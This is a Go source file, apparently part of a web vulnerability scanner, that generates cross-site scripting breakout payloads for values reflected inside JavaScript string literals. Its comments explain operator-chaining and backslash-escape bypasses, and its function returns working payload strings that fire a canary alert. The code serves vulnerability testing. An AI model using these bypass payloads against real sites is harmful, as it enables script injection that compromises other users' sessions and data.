// Package xssbreakout builds executable XSS breakout payloads shared across the
// reflected, DOM-confirm, and stored XSS modules so they confirm the same
// classes of flaw with one source of truth.
package xssbreakout

// JSStringPayloads returns executable breakout payloads for a value reflected
// inside a quote-delimited JavaScript string literal (quote is '\” or '"').
//
// It pairs operator-chaining breaks with the classic statement-terminator break,
// and each of those in two forms: a bare-quote form and a leading-backslash form.
//
// Operator chaining matters when the reflected string sits inside an *expression*
// — a function argument, array, or object literal such as foo('HERE') or
// {k:'HERE'} — where closing the string and injecting a statement terminator
// (';alert()//') produces a SyntaxError that aborts the whole <script>, so the
// alert never runs. Chaining the call into the surrounding expression with a
// binary operator keeps it syntactically valid and executes:
//
//	'weuci' ^ alert(1) ^ 'dsjiy'   →  one valid expression, alert fires.
//
// The leading backslash matters when the app escapes the breakout quote
// ('  ->  \') but does NOT escape the backslash — a very common encoder. A bare
// quote payload is then neutralized (';alert()//'  ->  \';alert()//', the quote
// stays inside the string), so the classic bypass is to send our own backslash
// ahead of the quote: the app escapes only the quote, turning \' into \\' — an
// escaped backslash followed by a LIVE closing quote — and the breakout fires:
//
//	input  \';alert(1)//   reflected as  'searchText\\';alert(1)//'   →  alert runs.
//
// The two forms are complementary, not redundant: on an app that reflects the
// quote verbatim the bare form breaks out and the backslash form does not; on an
// app that escapes the quote it is the reverse. confirm.go's body check is
// escape-aware, so only the form that actually broke out is credited.
//
// alertExpr is the JavaScript to execute, e.g. alert(`canary`) (use a template
// literal so the canary's quoting never collides with the breakout quote).
//
// Payloads are ordered most-general first: bare operator chaining executes in both
// statement and expression position, the bare terminator is the fallback for a
// filter that strips the chaining operators but keeps ';', and the
// backslash-prefixed forms cover the escape-the-quote-not-the-backslash apps.
func JSStringPayloads(quote byte, alertExpr string) []string {
	q := string(quote)
	bs := "\\" + q // leading backslash so the app's own quote-escaping yields \\'
	return []string{
		q + "^" + alertExpr + "^" + q, // bitwise XOR — rarely filtered
		q + "-" + alertExpr + "-" + q, // subtraction — the dalfox classic
		q + ";" + alertExpr + "//",    // statement terminator — fallback
		bs + ";" + alertExpr + "//",   // backslash-escape bypass + terminator
		bs + "-" + alertExpr + "//",   // backslash-escape bypass + operator chaining
	}
}
